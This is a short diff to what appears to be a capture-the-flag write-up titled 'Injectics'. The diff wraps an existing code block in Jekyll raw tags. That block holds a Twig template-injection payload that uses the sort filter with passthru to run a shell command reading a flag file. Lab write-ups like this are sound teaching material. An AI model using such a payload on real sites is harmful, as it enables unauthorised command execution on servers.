@@ -91,9 +91,11 @@ The passthru() function in PHP is for executing a system command and passing its
 
 My final payload was:
 
+{% raw %}
 ```
 {{['cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
 ```
+{% endraw %}
 
 ![](../assets/img/2026-01-15-Injectics/15.png)
 
